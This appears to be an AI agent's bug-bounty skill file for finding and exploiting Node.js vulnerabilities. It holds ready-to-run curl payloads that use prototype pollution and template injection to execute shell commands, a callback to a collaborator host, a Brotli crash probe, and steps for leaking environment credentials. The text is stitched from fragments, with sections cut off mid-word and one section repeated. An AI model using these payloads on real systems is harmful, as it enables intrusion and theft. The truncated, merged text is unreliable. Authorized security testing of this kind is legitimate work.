---
name: bbhunt-nodejs
description: "Hunt prototype pollution to RCE, trust-proxy abuse, eval/child_process injection and template-engine SSTI. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# Node.js-specific vulnerability hunting — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs to look for

- **CVE-2026-111497 "Node2Shell" / HTTP2Shell (Oct 2026)** — out-of-bounds write (CWE-787) plus unchecked return value (CWE-252) in the Brotli decoder bundled with Node.js. Google CVSS v4.0 **9.2**. Fixed runtimes: **22.23.4 / 24.22.1 / 26.12.1**; Node 20.x and 25.x are EoL with **no fix**. Upstream Brotli 1.0.3–1.2.0, fixed in 1.0.10 / 1.1.1 / 1.2.1; Bun ≤ 1.4.3 (fixed 1.4.4). Debian/Ubuntu/RHEL/Alpine may ship a *system* Brotli, so the Node.js `-v` number alone does not prove patched status — check the distro Brotli package.
- **Reachability fingerprints for Node2Shell** (the bug only matters where attacker-controlled bytes reach a decoder): **Express 5** + `express.json()` (body-parser 2.x, `inflate:true` by default) decodes `Content-Encoding: br` on any body-bearing route; **Express 4** body-parser 1.20.x rejects br with **415** through body-parser itself (other middleware may still decode); **server-side `fetch()`** decompresses any response with `Content-Encoding: br` even if you sent `Accept-Encoding: identity` (look for webhook/fetch features that take a user URL); direct `node:zlib` `createBrotliDecompress()`; **Koa** via `co-body` / `@koa/bodyparser` / `koa-body` / Egg / Strapi; **Fastify** with `@fastify/compress`.
- **lodash prototype-pollution cluster (2026):** **CVE-2026-2950** — `_.unset` / `_.omit` bypass the CVE-2025-13465 fix using **array-wrapped path segments**, allowing deletion of properties from `Object.prototype` / `Number.prototype` / `String.prototype`; fixed 

### Signals and surfaces

### Crown Jewel Targets

Prototype Pollution reaching a sink in Node.js backend = Critical RCE.

**Highest-value chains:**
- **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
- **Express trust proxy** — `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
- **`child_process` injection** — user input interpolated into shell command string → OS command injection
- **`require()` path traversal** — attacker-controlled module path → load arbitrary file as JS

---

### Attack Surface Signals

```
X-Powered-By: Express           Confirms Express.js
Node.js in error messages        Runtime detected
package.json exposed             Dependency list + versions
/proc/self/environ accessible    Environment variable exfil
Error stack traces with .js paths  Node.js confirmed
__proto__ in JSON accepted        Prototype pollution candidate
```

---

### Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Node2Shell probe shape:** send a POST with `Content-Encoding: br` and a hand-crafted Brotli stream whose meta-block declares one block type then requests a block-type switch. Patched builds fail immediately with `BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH` (the new error constant from upstream commit `0ed4268a`); unpatched builds either crash or continue into the OOB write. Use a **unique per-test subdomain** on a Collaborator for the callback — crashes are easy to reproduce, confirmed code execution is not.
- **Outbound variant:** if the app fetches attacker-controlled URLs (webhooks, link previews, URL import), host a Brotli-encoded response with `Content-Encoding: br`; Node's `fetch()` decompresses it regardless of the request's `Accept-Encoding`. Audit every `fetch()`/`http.get()` to an untrusted host.
- **Temporary mitigation to test the boundary:** `express.json({ inflate: false })` makes body-parser 415 compressed bodies (also rejects gzip). Rejecting `Content-Encoding: br` at the proxy is a layer, not a fix, and does not cover fetched responses.
- **Prototype-pollution → RCE sinks (refresh of the baseline):** array-wrapped paths for the lodash 2026 bypass (`{"__proto__": ...}` is less useful than `_.unset(obj, ["__proto__", "x"])`-shaped input); then chase sinks — `child_process` options pollution (`shell`, `NODE_OPTIONS="--require /proc/self/fd/0"`), `lodash.template` `sourceURL` injection, EJS `outputFunctionName` pollution, or `NODE_OPTIONS="--inspect=COLLAB"` for an inspector-port RC

### Validation and proof

### Validation

✅ Prototype pollution: key appears in subsequent API responses without being sent
✅ RCE chain: OOB callback received OR `id` output in response
✅ Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist

**Severity:**
- Prototype pollution → RCE: Critical
- SSTI → RCE: Critical
- child_process injection: Critical
- Trust proxy → rate limit bypass: Medium
- /proc/self/environ exfil: High (if cloud keys present)

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Node2Shell evidence quality matters.** Public research has repeatedly produced **crashes** but only one well-documented remote code-execution reproduction (Imperva on the official Node 24.22.0 arm64 image, needing several attempts); some analyses argue the reachable impact is DoS. Report "Brotli decoder memory corruption / process crash on unpatched Node.js" with confidence; claim RCE only with an OOB callback or command output. Note openly that cross-platform reliable RCE was not publicly demonstrated at publication time.
- **Version matching is a lead, not proof.** A vulnerable Node.js version only matters if the specific code path decodes attacker-controlled Brotli — Express 4 with only body-parser 1.20.x and no other decompressor is not reachable through that middleware. Document the exact reachable route/middleware or fetch call.
- **Separate the two lodash CVEs:** CVE-2026-2950 permits **deleting** prototype properties (stability/DoS and chain-enabling), not arbitrary overwriting. Do not describe it as "full prototype pollution → RCE" without demonstrating a downstream sink. Check the *fixed* version (4.18.1) against `package-lock.json`, not just `package.json`.
- **`trust proxy` false positive:** a rotated `X-Forwarded-For` that changes nothing means either `trust proxy` is off or the app uses a different header/store. Confirm by checking whether the server logs/reflects `req.ip` as your spoofed value before claiming a rate-limit bypass.
- **Blind primitives need OOB.** Prototype-pollution-

### Validation

✅ Prototype pollution: key appears in subsequent API responses without being sent
✅ RCE chain: OOB callback received OR `id` output in response
✅ Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist

**Severity:**
- Prototype pollution → RCE: Critical
- SSTI → RCE: Critical
- child_process injection: Critical
- Trust proxy → rate limit bypass: Medium
- /proc/self/environ exfil: High (if cloud keys present)

### Escalation and related chains

### Phase 3 — Prototype Pollution → RCE Chain

```bash
# If pollution is confirmed, attempt to reach dangerous sinks

# Sink 1: child_process via options.shell pollution
curl -s -X POST https://$TARGET/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--require /proc/self/fd/0",
      "env": {"NODE_OPTIONS": "--inspect=COLLAB_HOST"}
    }
  }'

# Sink 2: lodash template pollution (CVE-2021-23337)
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'

# Sink 3: ejs template options pollution
# If EJS is used for rendering, pollute the `opts.escapeXML` or `opts.outputFunctionName`
curl -s -X POST https://$TARGET/api/template \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'

# OOB confirmation — check Interactsh for callback
```

---

### Chain Table

| Node.js finding | Chain to | Impact |
|----------------|----------|--------|
| Prototype pollution confirmed | Find RCE sink (child_process, eval) | Critical RCE |
| Express trust proxy | Bypass IP allowlist / rate limit | Auth bypass / DoS bypass |
| SSTI in template engine | OS command execution | Critical RCE |
| child_process injection | `id && curl COLLAB_HOST` | Critical RCE |
| /proc/self/environ via LFI | AWS_ACCESS_KEY_ID leaked | Cloud compromise |

---

## Source skills merged into this topic

- `hunting` — `nodejs`
- `cbh` — `hunt-nodejs`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `bbhunt-methodology` — orchestrator, state machine and class router
